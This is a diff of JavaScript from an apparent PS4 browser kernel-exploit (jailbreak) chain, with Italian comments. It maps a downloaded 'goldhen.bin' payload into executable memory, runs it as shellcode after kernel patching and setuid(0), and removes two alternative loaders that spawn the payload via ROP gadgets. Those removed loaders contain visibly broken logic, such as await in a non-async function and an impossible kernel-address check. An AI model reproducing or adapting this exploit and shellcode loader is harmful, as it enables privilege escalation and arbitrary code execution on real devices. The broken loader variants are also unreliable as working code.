@@ -1496,7 +1496,7 @@ async function get_patches(url) {
     return response.arrayBuffer();
 }
 
- function array_from_address(addr, size) {
+function array_from_address(addr, size) {
         var og_array = new Uint32Array(0x1000);
         var og_array_i = p.leakval(og_array).add32(0x10);
 
@@ -1510,13 +1510,12 @@ async function get_patches(url) {
 
  function loadPayload(){
  var req = new XMLHttpRequest();
- var PLD;
  req.responseType = "arraybuffer";
  req.open('GET', 'goldhen.bin');
  req.send();
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
-    PLD = req.response;
+   var PLD = req.response;
    var payload_buffer = chain.syscall('mmap', 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
    var pl = array_from_address(payload_buffer, PLD.byteLength*4);
    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
@@ -1532,142 +1531,6 @@ async function get_patches(url) {
  };
 }
 
- function loadPayload3() {
-    let payloadBuffer = null; 
-    let payloadSize = 0;
-    
-    try {
-        const req = new XMLHttpRequest();
-        req.responseType = "arraybuffer";
-
-        await new Promise((resolve, reject) => {
-            req.open('GET', 'goldhen.bin');
-            req.onload = () => resolve();
-            req.onerror = () => reject(new Error("Errore di rete"));
-            req.send();
-        });
-
-        if (req.status !== 200) {
-            throw new Error(`Errore HTTP: ${req.status}`);
-        }
-
-        const PLD = req.response;
-        payloadSize = PLD.byteLength;
-
-        payloadBuffer = chain.syscall(
-            'mmap', 0, payloadSize,
-            7,       // PROT_READ | PROT_WRITE | PROT_EXEC
-            0x1002,  // MAP_ANONYMOUS | MAP_PRIVATE
-            -1, 0
-        );
-
-        if (payloadBuffer.low === 0 && payloadBuffer.hi === 0) {
-            throw new Error("mmap failed: memoria non allocata");
-        }
-
-        const rem = PLD.byteLength % 4;
-        const padLen = (4 - rem) % 4;
-        const padding = new Uint8Array(padLen);
-        const tmp = new Uint8Array(PLD.byteLength + padLen);
-        tmp.set(new Uint8Array(PLD), 0);
-        tmp.set(padding, PLD.byteLength);
-        const shellcode = new Uint32Array(tmp.buffer);
-
-        const pl = mem.array_from_address(payloadBuffer, PLD.byteLength * 4);
-        pl.set(shellcode);
-
-        const pthread = chain.malloc(0x10);
-        const result = chain.call(
-            rop.libkernel_base.add32(0x00025510),
-            pthread, 0, payloadBuffer, 0
-        );
-
-        if (result.low !== 0) {
-            throw new Error(`Errore pthread_create: 0x${result.toString(16)}`);
-        }
-
-    } catch (e) {
-        console.error("[PAYLOAD ERROR]", e);
-        alert(`ERRORE: ${e.message}`);
-
-        // cleanup sicuro
-        if (payloadBuffer && payloadSize)
-            chain.syscall('munmap', payloadBuffer, payloadSize);
-
-        throw e;
-    }
-}
-async function loadPayload2() {
-    try {
-        // 1. Inizializza memory manager
-        if (!mem?.buffer) {
-            mem.buffer = new ArrayBuffer(0x10000000);
-            console.log("Memory pool initialized");
-        }
-
-        // 2. Caricamento payload con verifica CORS
-        const response = await fetch('goldhen.bin', {
-            mode: 'cors',
-            credentials: 'omit'
-        });
-        
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        const payload = await response.arrayBuffer();
-        
-        // 3. Allineamento a 4KB boundary
-        const PAGE_SIZE = 0x1000;
-        const alignedSize = Math.ceil(payload.byteLength / PAGE_SIZE) * PAGE_SIZE;
-        
-        // 4. Allocazione memoria kernel
-        const payloadAddr = chain.syscall(
-            'mmap',
-            0,
-            alignedSize,
-            7,
-            0x1002,
-            -1,
-            0
-        );
-
-        // 5. Controllo indirizzo valido (kernel space PS4/PS5)
-        const MIN_KERNEL_ADDR = 0xffff000000000000;
-        if (payloadAddr < MIN_KERNEL_ADDR) {
-            throw new Error(`mmap failed: invalid addr ${hex(payloadAddr)}`);
-        }
-
-        // 6. Copia protetta con WebAssembly
-        const memory = new WebAssembly.Memory({ initial: 1 });
-        const view = new Uint8Array(memory.buffer);
-        view.set(new Uint8Array(payload));
-        
-        const copyOps = new Uint8Array(mem.buffer, payloadAddr, alignedSize);
-        copyOps.set(view.subarray(0, alignedSize));
-
-        // 7. Esecuzione con stack guard
-        const pthread = spawn_thread(new Chain()
-            .push_gadget('mov r15, rsp')    // Salva stack pointer
-            .push_gadget('sub rsp, 0x1000') // Alloca stack protetto
-            .push_value(payloadAddr)         // Entry point
-            .push_gadget('call r15')        // Chiama payload
-            .push_gadget('add rsp, 0x1000') // Ripristina stack
-            .push_gadget('ret')
-        );
-
-        
-        const joinPromise = chain.call_async('pthread_join', pthread, 0);
-        const timeoutPromise = new Promise((_, reject) => 
-            setTimeout(() => reject(new Error("Timeout")), 10000));
-
-        await Promise.race([joinPromise, timeoutPromise]);
-
-        alert("SUCCESS! GoldHEN activated");
-
-    } catch (e) {
-        console.error("[FATAL ERROR]", e);
-        alert(`BOOT FAIL: ${e.message}\nReboot console!`);
-        throw e;
-    }
-}
 // 9.00 supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
@@ -1770,9 +1633,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-  // await loadPayload().catch(() => die("Payload fallito"));
- loadPayload();
-  //  alert("kernel exploit succeeded!");
+    loadPayload();
+    //alert("kernel exploit succeeded!");
 }
 
 // FUNCTIONS FOR STAGE: SETUP
